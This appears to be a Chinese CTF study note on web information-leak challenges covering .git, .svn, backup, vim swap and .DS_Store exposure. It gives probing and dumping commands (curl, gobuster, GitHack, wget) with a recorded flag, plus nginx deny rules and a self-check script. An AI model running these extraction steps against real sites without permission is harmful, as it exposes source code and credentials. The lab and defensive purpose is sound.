> 来源：task9 —— CTFHub 技能树 Web · 信息泄露模块
> 动手记录见 `../logs/2026-10-17.md`

---

## 一、这类漏洞的本质

**不是"绕过"，是"服务器上还留着不该留的文件"。**

```
开发者/运维图方便留下的东西（.git / .env / .bak / .swp / .DS_Store）
        ↓
它们被放在了 web 根目录下，HTTP 能直接读到
        ↓
攻击者拿到的是【服务器的目录结构 + 源码 + 凭据】
        ↓
这是整条攻击链的起点
```

**核心认知：**

| 误解 | 事实 |
|---|---|
| 隐藏文件（`.` 开头）就安全 | **HTTP 不看你的 `ls`**，`.git` 就是普通目录 |
| 删掉文件就没了 | git/svn 里对象只增不减，`git rm` 删不掉 |
| 信息泄露是低危 | 一份源码 = 所有硬编码密钥 = 数据库 = 服务器 |

## 二、五类泄露：探测 → 利用

### 2.1 备份文件下载（4 小题）

**四种载体：**

| 类型 | 路径形态 | 怎么找 | 怎么用 |
|---|---|---|---|
| **网站源码包** | `www.zip` `web.tar.gz` `backup.zip` | 页面给字典 or 爆破 | 解压 → `grep -r` |
| **后缀变体备份** | `index.php.bak` `config.php.old` `index.php~` | 对已知文件名加后缀 | 直接读（不解析） |
| **vim 交换文件** | `.index.php.swp` | 固定思路 | `grep -a` / `vim -r` |
| **macOS 元数据** | `.DS_Store` | 固定路径 | 解析出文件名 → 访问 |

**① 网站源码**

```bash
# 页面通常直接给字典（7 个名字 × 4 个后缀）
gobuster dir -u "$T/" -w ~/wordlists/backup-all.txt -q

# 拿下之后：文件名本身也是线索
unzip www.zip -d out
find out -type f | sed 's|^out/||' | while read -r p; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "$T/$p")
  echo "$code  /$p"
done
```

> **关键**：zip 里的 `flag_1234567890.txt` 内容是 "where is flag ??" —— **提示的是文件名，真 flag 在 `/flag_1234567890.txt`**。
> 随机数字后缀是为了防抄 wp，每个人都不一样。

**② `.bak` 为什么能泄露源码（原理）**

服务器**按扩展名**决定要不要交给 PHP 解析：

```
GET /index.php       → 扩展名 .php → 交给 PHP-FPM 执行 → 只返回 echo 的输出
GET /index.php.bak   → 扩展名 .bak → 当静态文件         → 原封不动吐出来
```

**位置很重要**：

| 文件名 | 最后扩展名 | 结果 |
|---|---|---|
| `index.php.bak` | `.bak` | ✅ 泄露 |
| `index.bak.php` | `.php` | ❌ 被解析，不泄露 |
| `index_backup.php` | `.php` | ❌ 被解析 |

**③ vim 交换文件**

```bash
curl -s -O "$T/.index.php.swp"
head -c 16 .index.php.swp | od -A x -t x1z     # 魔数 b0VIM + 版本
grep -ao "flag{[^}]*}" .index.php.swp          # 最快
vim -r .index.php.swp                          # 最完整，但可能截断
```

**三种取法的可靠性（实测结论）：**

| 方法 | 可靠性 | 说明 |
|---|---|---|
| `grep -a` | ⭐⭐⭐ | swap 不加密，直接搜明文 |
| `strings` | ⭐⭐ | 顺带能拿到**服务器绝对路径**和运行用户 |
| `vim -r` | ⚠️ | **数据块可能只写了一半 → 恢复出来是残缺的** |

> **认知修正**：不是"必须用 `vim -r`"。swap 是按块异步写的，崩溃时可能只写了一半，`grep` 反而更完整。

**命名规则**（`swp` → `swo` → `swn` 依次递减）：

```
.swp  第 1 个 vim 会话
.swo  第 2 个
.swn  第 3 个
.un~  持久化 undo
~     备份文件
```

**④ `.DS_Store`**

```bash
curl -s -O "$T/.DS_Store"
head -c 32 .DS_Store | od -A x -t x1z        # 签名: \x00\x00\x00\x01 Bud1
pip install --break-system-packages ds_store
python3 -c "
from ds_store import DSStore
with DSStore.open('.DS_Store','r') as d:
    for e in d: print(e.filename)
"
```

**记录结构（重要）：**

```
┌─────────────┬──────────┬──────────┬──────────────┐
│  filename   │   code   │   type   │    value     │
├─────────────┼──────────┼──────────┼──────────────┤
│ 74430ae6... │  'note'  │  'ustr'  │ 'flag here!' │
│   .txt      │ (注释)   │ (UTF-16) │   ← 诱饵     │
└─────────────┴──────────┴──────────┴──────────────┘
      ↑             ↑          ↑            ↑
   真实文件名   属性类型   数据类型      实际内容
```

> **只要 `filename`，不要 `value`。** 出题人会把假 flag 写进 `value`（Finder 注释）里骗人。
> **不要手写 UTF-16 启发式扫描** —— DS_Store 是 Buddy Allocator 二进制格式，手写会漏真名字 + 误报假线索。

### 2.2 Git 泄露（Log）

> 以下流程 2026-10-18 在实例 `challenge-41019ce7441deaee` 上完整走通。

**四条命令（主体）：**

```bash
# ── 0. 目标 ──
T="http://challenge-41019ce7441deaee.sandbox.ctfhub.com:10800"

# ── 1. 探测 ──
curl -s "$T/.git/HEAD"                                          # ref: refs/heads/master
curl -s "$T/.git/logs/HEAD"                                     # 三次提交 + 哈希
curl -s -o /dev/null -w "%{http_code}\n" "$T/.git/objects/"     # 403 → 走 GitHack

# ── 2. 搬运 ──
cd ~/tools/githack/GitHack-master
python2 GitHack.py "$T/.git"

# ── 3. 进仓库 ──
cd dist/challenge-41019ce7441deaee.sandbox.ctfhub.com_10800

# ── 4. 挖 flag ──
git show 4d330484
```

**本次实例的关键数据：**

| 项 | 值 |
|---|---|
| `init` | `4914b07da16e2dd74f2ff2ce4593355319f2b4d3` |
| **`add flag`** | **`4d33048430db519e855d8a83c31036db29481b4c`** ★ |
| `remove flag` | `94425515342b0fdd3d0b77629a7f4e9a42519502` |
| flag 文件名 | `6654926415002.txt` |
| flag | `ctfhub{d57b85603ca77329a3ae5a18}` |

#### 第 1 步：探测三连

```bash
curl -s "$T/.git/HEAD"                                        # ① 有没有 .git
curl -s "$T/.git/logs/HEAD"                                   # ② 三次提交的哈希 + 说明
curl -s -o /dev/null -w "%{http_code}\n" "$T/.git/objects/"   # ③ 走哪条路线
```

**② 的返回怎么读 —— 取 `commit: add flag` 那行的第二列：**

```
<旧哈希>  <新哈希>  <作者> <邮箱> <时间戳> <时区>  <动作>: <说明>
    │        │
    │        └─ 这次动作【之后】指向的提交  ★ 要这一列
    └─ 这次动作【之前】指向的提交

0000...0000  4914b07d...  commit (initial): init
4914b07d...  4d330484...  commit: add flag          ★ 取 4d330484
4d330484...  94425515...  commit: remove flag
```

**自洽检查**：同一个提交在相邻两行出现两次（上一行的"新" = 下一行的"旧"），对得上才说明 reflog 完整。

| 现象 | 原因 |
|---|---|
| `404` / 返回 HTML | 没有 `.git`，换题型 |
| `curl: (7)` | 靶场过期 / `$T` 拼错 → `echo $T` |
| 第②条为空 | reflog 被清过，改从 `.git/index` 拿 blob 哈希 |

---

#### 第 2 步：搬运 —— 状态码决定路线

| `objects/` | 路线 | 依赖 |
|---|---|---|
| **200**（能列目录） | A · `wget -r` 爬树 | 只要 `wget` |
| **403 / 404**（不能列） | B · GitHack 按哈希取 | GitHack + `python2` |

**路线 A（200）：**

```bash
wget -q -r -np -nH --cut-dirs=1 -R "index.html*" "$T/.git/" -P ./dumped
```

⚠️ **两个坑：**
- `-R "index.html*"` 不能省 —— 目录列表页会生成 `index.html`，不排除会污染仓库
- **`--cut-dirs=1` 会把 `.git` 这一层削掉** → `dumped/` 里的内容**就是 `.git` 本身**，不是 `dumped/.git/`
  ```bash
  mkdir -p repo && mv dumped repo/.git     # 改成标准布局
  git -C repo log --all --oneline
  ```

**路线 B（403 / 404）：**

```bash
cd ~/tools/githack/GitHack-master
python2 GitHack.py "$T/.git"
```

**必须 `python2`** —— 它是 2017 年的 Py2 代码（`import urlparse`），`python3` 会 `ModuleNotFoundError`。

它内部两套方案自动降级：能列目录就爬树，不能列就读 `index` / `logs/HEAD` 拿哈希再按哈希取。

#### 第 3 步：进仓库

**git 是"就近找 `.git`"的** —— 从当前目录往上找，找不到就报：

```
fatal: not a git repository (or any of the parent directories): .git
```

**GitHack 的产物目录名 = `netloc` 里的 `:` 换成 `_`：**

```
http://challenge-41019ce7441deaee.sandbox.ctfhub.com:10800
        ↓
challenge-41019ce7441deaee.sandbox.ctfhub.com_10800
```

**所以 `cd dist/$T` 不行**（URL 不是目录名）。三种正确写法：

```bash
# ① sed 转换（和 GitHack 源码同一规则）
D=$(echo "$T" | sed -e 's|https\?://||' -e 's|:|_|')

# ② bash 内置换（最快）
D=${T#http://}; D=${D#https://}; D=${D//:/_}

# ③ 通配符（只在 dist/ 里只有一个目标时安全，多个会 too many arguments）
```

**最省事：`git -C`，不用 cd**

```bash
git -C ~/tools/githack/GitHack-master/dist/"$D" show 4d330484
```

#### 第 4 步：挖 flag（五选一）

| # | 命令 | 输出 | 改工作区 |
|---|---|---|---|
| 1 | `git log --all -p \| grep -i ctfhub` | 全历史里带 flag 的行（±） | ❌ |
| 2 | `git show <add-flag哈希>` | 那一次提交的 diff | ❌ |
| 3 | `git diff <init> <add-flag>` | 两版本差异，**最干净** | ❌ |
| 4 | `git show <哈希>:<文件名>` | **文件原文**，连 checkout 都不用 | ❌ |
| 5 | `git checkout <哈希> -- .` | 恢复到工作区 | ✅ |

**不知道哈希就用相对位置：**

```bash

git show HEAD~1      # add flag    ★
git show HEAD~2      # init
```

#### 补充 A：短哈希规则（实测）

| 输入位数 | 结果 |
|---|---|
| 40 / 12 / 10 / 7 / 5 / **4** | ✅ 能解析（只要在对象库里**唯一**） |
| **3 / 2 / 1** | ❌ `fatal: Needed a single revision` |

- **4 位是硬下限**（git 源码 `MINIMUM_ABBREV = 4`），少于 4 位会被当"引用名"解析，不是哈希
- 前缀不唯一 → `error: short object ID xxx is ambiguous`
- 大写也认（`95956B3` ✅）
- **`git log --oneline` 默认输出 7 位**，直接复制即可
- 规范化：`git rev-parse --short <哈希>` → 7 位

**bash 的 Tab 补全不认哈希**（只补文件名/命令/分支），哈希得自己复制。

### 2.3 SVN 泄露

**起因**：在 web 目录 `svn checkout` 部署，`.svn` 留在 web 根。
（`svn export` 不带 `.svn`，是安全的部署方式）

**两个版本差别（考点）：**

| 版本 | `.svn` 位置 | 元数据 | 利用 |
|---|---|---|---|
| ≤ 1.6 | **每个子目录**都有 | `entries`（**纯文本**）+ `text-base/` | 读 entries 拿文件名 → 读 `text-base/<名>.svn-base` |
| ≥ 1.7 | **只有根目录** | `wc.db`（**SQLite**）+ `pristine/` | 下 wc.db → `sqlite3` 查 NODES → 读 `.svn/pristine/<hash前2位>/<hash>.svn-base` |

```bash
# 1.6
curl -s "$T/.svn/entries"
curl -s "$T/.svn/text-base/index.php.svn-base"

# 1.7+
curl -s -O "$T/.svn/wc.db"
sqlite3 wc.db "SELECT local_relpath, checksum FROM NODES WHERE kind='file';"
```

**注意**：wc.db 里的 checksum 带 `$sha1$` 前缀，取文件名时要去掉。

## 三、这套流程为什么成立

三件事支撑了上面的四步流程：

| 事实 | 作用 |
|---|---|
| **哈希 = 路径**（`.git/objects/<h[:2]>/<h[2:]>`） | 403 下也能按哈希精确取对象 |
| **对象是 zlib 压缩的** | GitHack 帮你解压；手工取要 `zlib.decompress()` 再切 `\0` |
| **`git rm` 不删对象** | 只让新 tree 不再指向它，blob 永久留在 objects 里 |

**彻底删除必须两步**：`git reflog expire --expire=now --all` + `git gc --prune=now`。
**绝大多数人只做 `git rm`** —— 这就是 99% 的 Git 泄露还能挖到东西的原因。

**推论：工具的职责只是"搬运"** —— 把远程 `.git/objects/` 弄到本地。`git show` 是纯本地命令，一个网络请求都不发；对象不齐它就报 `Could not read <父提交哈希>`。

## 六、上线前自查（五秒能挡掉本模块全部题目）

```bash
for p in .git/HEAD .svn/entries .hg/requires .env .DS_Store \
         www.zip index.php.bak .index.php.swp; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://your-site/$p")
  [ "$code" = "200" ] && echo "[!] 泄露: /$p"
done
```

**服务器层配置：**

```nginx
location ~ /\.(git|svn|hg|env) { deny all; return 404; }
location ~* \.(bak|old|orig|save|swp|swo|swn|sql|zip|tar|gz)$ { deny all; return 404; }
```

**部署层：** 用**构建产物**部署，不要在 web 目录 `git clone` / `svn checkout`；上线脚本里加 `rm -rf .git .svn .env *.bak *.swp`。

## 七、一句话总结每类

| 类型 | 一句话 |
|---|---|
| 网站源码 | 页面给字典 → 枚举 → 解压 → **文件名当 URL 试一遍** |
| bak 文件 | 文件名已知 → 加后缀；`.bak` 不被解析所以裸奔 |
| vim 缓存 | `.文件名.swp` → **`grep -a` 优先**，`vim -r` 次之 |
| .DS_Store | 解析出文件名 → 挨个访问（**只取 filename，不看 value**） |
| Git Log | `logs/HEAD` 拿哈希 → 按哈希取 → `git log --all -p \| grep` |
| Git Stash | `git stash list` → `stash show -p` |
| Git Index | `ls-files --stage` → `cat-file -p <hash>` |
| SVN | 1.6 读 `entries`+`text-base`；1.7 读 `wc.db`+`pristine` |
| HG | `.hg/requires` → `hg log` / `strings 00changelog.i` |
